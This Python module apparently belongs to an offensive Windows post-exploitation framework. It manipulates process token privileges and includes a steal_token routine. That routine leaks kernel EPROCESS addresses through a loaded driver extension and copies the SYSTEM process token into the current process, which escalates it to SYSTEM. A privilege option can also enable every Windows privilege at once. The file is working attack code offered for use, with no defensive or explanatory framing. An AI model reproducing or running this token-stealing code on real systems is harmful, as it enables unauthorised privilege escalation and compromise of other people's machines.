import eternalhush as eh
from additional.clingyspider import api
from additional.clingyspider import const
from additional.clingyspider import extapi
import additional.darknarrator as dana 
from additional import memrwlib
from additional.clingyspider.nt_const import *
import os


all_privileges = [
    const.SE_CREATE_TOKEN_NAME,
    const.SE_ASSIGNPRIMARYTOKEN_NAME,
    const.SE_LOCK_MEMORY_NAME,
    const.SE_INCREASE_QUOTA_NAME,
    const.SE_UNSOLICITED_INPUT_NAME,
    const.SE_MACHINE_ACCOUNT_NAME,
    const.SE_TCB_NAME,
    const.SE_SECURITY_NAME,
    const.SE_TAKE_OWNERSHIP_NAME,
    const.SE_LOAD_DRIVER_NAME,
    const.SE_SYSTEM_PROFILE_NAME,
    const.SE_SYSTEMTIME_NAME,
    const.SE_PROF_SINGLE_PROCESS_NAME,
    const.SE_INC_BASE_PRIORITY_NAME,
    const.SE_CREATE_PAGEFILE_NAME,
    const.SE_CREATE_PERMANENT_NAME,
    const.SE_BACKUP_NAME,
    const.SE_RESTORE_NAME,
    const.SE_SHUTDOWN_NAME,
    const.SE_DEBUG_NAME,
    const.SE_AUDIT_NAME,
    const.SE_SYSTEM_ENVIRONMENT_NAME,
    const.SE_CHANGE_NOTIFY_NAME,
    const.SE_REMOTE_SHUTDOWN_NAME,
    const.SE_UNDOCK_NAME,
    const.SE_SYNC_AGENT_NAME,
    const.SE_ENABLE_DELEGATION_NAME,
    const.SE_MANAGE_VOLUME_NAME,
    const.SE_IMPERSONATE_NAME,
    const.SE_CREATE_GLOBAL_NAME,
    const.SE_TRUSTED_CREDMAN_ACCESS_NAME,
    const.SE_RELABEL_NAME,
    const.SE_INC_WORKING_SET_NAME,
    const.SE_TIME_ZONE_NAME,
    const.SE_CREATE_SYMBOLIC_LINK_NAME,
    const.SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
]

def steal_token():
    current_pid = int(eh.ui.GetEnv("CLSP_PROCESS_ID"))
    hcurrentproc = api.GetProcessHandle(current_pid, const.PROCESS_ALL_ACCESS)
    if not hcurrentproc:
        eh.ui.Echo(f"Failed to get handle to current process ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
        return
    
    current_eprocess = extapi.InvokeUserExtensionApi(dana.DANA_LEAK_KERNEL_OB, hcurrentproc, current_pid)
    api.CloseHandle(hcurrentproc)
    if not current_eprocess:
        eh.ui.Echo(f"Failed to leak current EPROCESS ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
        return
    eh.ui.Echo(f"Current EPROCESS kernel address: {hex(current_eprocess)}", eh.ECHO_DEFAULT)

    target_eprocess = extapi.InvokeUserExtensionApi(dana.DANA_LEAK_KERNEL_OB, 0x4, 4)
    if not target_eprocess:
        eh.ui.Echo(f"Failed to leak System EPROCESS ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
        return
    eh.ui.Echo(f"System EPROCESS kernel address: {hex(target_eprocess)}", eh.ECHO_DEFAULT)

    if api.IsX64():
        token = int.from_bytes(extapi.InvokeUserExtensionApi(dana.DANA_READ_VIRT_MEM, target_eprocess+0x4b8, 8), 'little') & 0xfffffffffffffff0
        eh.ui.Echo(f"System process token: {hex(token)}", eh.ECHO_DEFAULT)
        wr = extapi.InvokeUserExtensionApi(dana.DANA_WRITE_VIRT_MEM, current_eprocess+0x4b8, token.to_bytes(8, 'little'))
        if wr:
            eh.ui.Echo(f"Token successfully updated", eh.ECHO_GOOD)
    


def main(args):
    if not args.query_priv and not args.enable_priv and not args.disable_priv and not args.steal_token:
        eh.ui.Echo("No arguments provided. Use .help", eh.ECHO_ERROR)
        return

    if args.steal_token:
        if dana.DANA_IsReady():
            return steal_token()
        else:
            eh.ui.Echo("Cannot steal token, DarkNarrator not loaded!", eh.ECHO_ERROR)
            return


    hproc = args.use_handle
    if not args.use_handle:
        if not args.pid:
            hproc = api.GetCurrentProcess()
        else:
            hproc = api.GetProcessHandle(args.pid, const.PROCESS_QUERY_INFORMATION | const.PROCESS_DUP_HANDLE)

    if not hproc:
        eh.ui.Echo("Failed to open target process handle", eh.ECHO_ERROR)
        return

    htoken = api.GetProcessToken(hproc, const.TOKEN_READ | const.TOKEN_WRITE)
    if not htoken:
        eh.ui.Echo("Failed to open target process token", eh.ECHO_ERROR)
        if hproc != api.GetCurrentProcess():
            api.CloseHandle(hproc)
        return
    
    if args.enable_priv:
        priv_list = args.enable_priv.split(",")
        if priv_list[0] == "*":
            priv_list = all_privileges
        for name in priv_list:
            result = api.AdjustPrivilegesToken(htoken, name, const.SE_PRIVILEGE_ENABLED)
            if not result:
                eh.ui.Echo("Failed to enable '{}' privilege!".format(name), eh.ECHO_ERROR)

        eh.ui.Echo("Ok!", eh.ECHO_GOOD)
    
    if args.disable_priv:
        priv_list = args.disable_priv.split(",")
        if priv_list[0] == "*":
            priv_list = all_privileges
        for name in priv_list:
            result = api.AdjustPrivilegesToken(htoken, name, 0)
            if not result:
                eh.ui.Echo("Failed to disable '{}' privilege!".format(name), eh.ECHO_ERROR)
        eh.ui.Echo("Ok!", eh.ECHO_GOOD)

    if args.query_priv:
        priv_list = args.query_priv.split(",")
        if priv_list[0] == "*":
            priv_list = all_privileges
        ret_set = api.QueryPrivilegesToken(htoken, priv_list)
        for e_name in ret_set:
            if ret_set[e_name]:
                eh.ui.Echo("{:41} --> Enabled".format(e_name), eh.ECHO_GOOD)
            else:
                eh.ui.Echo("- {:41} --> Disabled".format(e_name), eh.ECHO_DEFAULT)

    if hproc:
        api.CloseHandle(htoken)

    if hproc and hproc != api.GetCurrentProcess():
        api.CloseHandle(hproc)
